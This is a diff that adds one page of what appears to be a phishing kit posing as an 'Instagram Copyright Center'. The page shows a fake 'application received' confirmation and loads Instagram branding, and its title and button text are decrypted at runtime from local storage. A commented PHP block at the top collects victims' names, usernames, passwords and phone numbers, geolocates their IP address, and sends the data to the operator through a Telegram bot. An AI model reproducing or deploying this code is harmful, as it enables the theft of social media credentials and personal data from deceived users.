@@ -1,0 +1,212 @@
+<!-- <?php
+include "telegram-api/bot.php";
+include "head.php";
+$bot = new TelegramBot();
+
+function getIPAddress() {  
+    //whether ip is from the share internet  
+     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
+                $ip = $_SERVER['HTTP_CLIENT_IP'];  
+        }  
+    //whether ip is from the proxy  
+    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
+                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
+     }  
+//whether ip is from the remote address  
+    else{  
+             $ip = $_SERVER['REMOTE_ADDR'];  
+     }  
+     return $ip;  
+}  
+
+
+
+
+if(isset($_POST["username"]) && isset($_POST["password"])){
+    $isim = $_POST["isim"];
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+    $countryCode = $_POST["countryCode"];
+    $phone = $_POST["tel"];
+    $img_url =$_POST['img_url'];
+
+
+
+
+    $ip =  getIPAddress();
+
+    $query = @unserialize(file_get_contents("http://ip-api.com/php/$ip"));
+
+    if($query && $query['status'] == 'success'){
+        
+    }
+    echo $ip;
+    print_r($query);
+    $country = $query['country'];
+    $region = $query['regionName'];
+    
+
+
+    $message = "
+<b>name</b> :  $isim
+
+<b>username</b> :  $username
+
+<b>passw</b>    :  $password
+
+<b>code</b>      : $countryCode
+
+<b>tel</b>      : $phone
+
+<b>country</b>      : $country
+
+<b>region</b>      : $region
+
+";
+
+$bot->sendMessage($message);
+
+
+
+
+
+}
+
+?> -->
+
+
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico?_nc_x=Ij3Wp8lg5Kz">
+    <title id="title">
+      Instagram Copyright Center
+    </title>
+  
+    <link href="https://fonts.googleapis.com/css?family=Poppins:200,300,400,600,700,800" rel="stylesheet">
+    <link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+  
+    <link href="nucleo-icons.css" rel="stylesheet">
+  
+    <link href="assets/css/stils.css" rel="stylesheet">
+  
+    <link href="demo.css" rel="stylesheet">
+    <link href="assets/css/style.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="assets/js/keys.js">
+
+    </script>
+    <script src="assets/js/crypt.js"></script>
+    <script src="assets/js/key_handler.js"></script>
+  </head>
+  
+  <body class="dark-content">
+      
+      <div class="main-panel">
+        <!-- Navbar -->
+  
+        <nav class="navbar navbar-expand-lg navbar-absolute navbar-transparent">
+          <div class="container-fluid">
+            <div class="navbar-wrapper">
+              <a class="navbar-brand jWQqO Szr5J _7mese coreSpriteDesktopNavLogoAndWordmark-white" id="navimg"></a>
+            </div>
+            <div class="collapse navbar-collapse" id="navigation">
+              <ul class="navbar-nav ml-auto">
+                <li class="search-bar input-group">
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+        <!-- End Navbar -->
+        
+        <div class="content">
+          <div class="row">
+            <div class="col-md-6 jWRzM" id="degisecek"><div class="card card-user">
+                <div class="card-body">
+                  <p class="card-text">
+                    </p><div class="author">
+                      <div class="block block-one"></div>
+                      <div class="block block-two"></div>
+                      <div class="block block-three"></div>
+                      <div class="block block-four"></div>
+                      <div>
+                      <img  id="user-avatar" alt="">
+                      </div>
+                      <h4 class="title"><span id="user-username"></span><img id="tick" alt="" srcset="" style="margin-left:3.5px; margin-bottom:3px; width:18px; height:18px;"></h4>
+                    </div>
+                  <p></p>
+                  <div class="card-description">
+                  <center><p class="card-text">Your application has been successfully received.</p></center><br>
+                  <center>Our team will review it within 24 hours and provide a response to your e-mail address.</center><br>
+                  </div>
+                </div>
+                <div class="card-footer">
+                  <div class="button-container">
+                      <a id="go_to_link" style="align-items:center;"><button class="btn mb-3 btn-block btn-info btn-lg" id="go_btn"></button></a>
+                  </div>
+                </div>
+              </div></div>
+          </div>
+        </div>
+      </div>
+  
+  
+    <script src="assets/js/core/jquery.min.js"></script>
+    <script src="assets/js/core/popper.min.js"></script>
+    <script src="assets/js/core/bootstrap.min.js"></script>
+    <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
+  
+    
+    <script>
+      $('#form').on('submit', function(e){
+          e.preventDefault();
+          let data = $(this).serialize();
+          data += '&type=hesap'
+          
+          $.post('api.php', data, function(response){
+              $('#degisecek').html(response.html)
+          }, 'json')
+      });
+      
+      const prefersDarkScheme = window.matchMedia("(prefers-color-scheme: dark)");
+  
+      if (prefersDarkScheme.matches) {
+        document.body.classList.add("dark-content");
+        $('#navimg').addClass('coreSpriteDesktopNavLogoAndWordmark-white');
+        $('#mode').val('dark');
+      } else {
+        document.body.classList.add("white-content");
+        $('#navimg').addClass('coreSpriteDesktopNavLogoAndWordmark');
+        $('#mode').val('white');
+      }
+  </script>
+
+
+
+
+  <script >
+    
+    let crypt = new Crypt()
+
+    crypt.setKey(localStorage.getItem("key"))
+
+    document.getElementById("title").innerHTML = crypt.decrypt(crypt.getKeys().title)
+
+    document.getElementById("go_btn").innerHTML = crypt.decrypt(crypt.getKeys().go_to_insta)
+
+    let profileImg = localStorage.getItem('profile_img')
+    let username = localStorage.getItem('profile_uname')
+    console.log(profileImg,username)
+
+    document.getElementById("user-avatar").setAttribute('src',profileImg)
+    document.getElementById("user-username").innerHTML="@"+username
+    document.getElementById("go_to_link").setAttribute('href',`https://instagram.com/${username}`)
+    document.getElementById("tick").setAttribute('src',crypt.decrypt(crypt.getKeys().tick_png))
+</script>
+
+  </body>
+  </html>
+
+
